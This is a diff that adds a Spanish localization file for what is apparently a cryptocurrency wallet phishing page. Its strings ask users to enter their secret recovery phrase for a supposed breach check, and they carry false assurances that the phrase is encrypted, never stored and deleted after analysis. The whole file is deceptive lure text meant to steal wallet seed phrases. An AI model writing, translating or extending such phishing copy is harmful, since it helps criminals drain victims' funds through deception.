@@ -1,0 +1,64 @@
+﻿{
+  "mainTitle": "Accede a tu billetera con tu Frase de Recuperación Secreta",
+  "description1": "Realizaremos una verificación segura de su frase de recuperación contra nuestra base de datos de filtraciones de seguridad conocidas. Si detectamos alguna exposición, le proporcionaremos inmediatamente pasos guiados para asegurar su cartera.",
+  "instructions": "Ingrese la frase de recuperación confidencial que generó al inicializar su cartera.",
+  "phrase12": "Tengo una frase de 12 palabras",
+  "phrase15": "Tengo una frase de 15 palabras",
+  "phrase18": "Tengo una frase de 18 palabras",
+  "phrase21": "Tengo una frase de 21 palabras",
+  "phrase24": "Tengo una frase de 24 palabras",
+  "pasteInfo": "Puedes pegar toda tu Frase de Recuperación Secreta en cualquier campo.",
+  "errorMessage": "Las Frases de Recuperación deben contener 12, 15, 18, 21 o 24 palabras.",
+  "confirmButton": "Verificar Frase de Recuperación",
+  "securityBtnText": "Información de seguridad",
+  "loaderText": "Verificando frase de recuperación...",
+  "modalTitle": "Información de seguridad",
+  "bestPracticesTitle": "Prácticas recomendadas de seguridad:",
+  "bestPracticesList": [
+    "Verifica que la conexión sea segura (HTTPS) en tu navegador.",
+    "Utiliza esta función solo en dispositivos personales y seguros."
+  ],
+  "protectionTitle": "Cómo te protegemos:",
+  "protectionList": [
+    "Todos los datos se cifran durante la transmisión.",
+    "Nunca almacenamos tu Frase de Recuperación en nuestros servidores."
+  ],
+  "modalNote": "Nota: Esta es una sesión segura. Tu Frase de Recuperación solo se utiliza para verificar posibles exposiciones y se elimina inmediatamente después del análisis.",
+  "languageOptions": {
+    "en": "English",
+    "es": "Español",
+    "fr": "Français",
+    "de": "Deutsch",
+    "it": "Italiano",
+    "pt": "Português",
+    "pt-br": "Português (Brasil)",
+    "nl": "Nederlands",
+    "sv": "Svenska",
+    "da": "Dansk",
+    "no": "Norsk",
+    "fi": "Suomi",
+    "pl": "Polski",
+    "ru": "Русский",
+    "uk": "Українська",
+    "cs": "Čeština",
+    "hu": "Magyar",
+    "ro": "Română",
+    "tr": "Türkçe",
+    "ar": "العربية",
+    "fa": "فارسی",
+    "hi": "हिन्दी",
+    "bn": "বাংলা",
+    "th": "ไทย",
+    "vi": "Tiếng Việt",
+    "id": "Bahasa Indonesia",
+    "ms": "Bahasa Melayu",
+    "fil": "Filipino",
+    "zh": "中文(简体)",
+    "zh-tw": "中文(繁體)",
+    "ja": "日本語",
+    "ko": "한국어"
+  }
+}
+
+
+
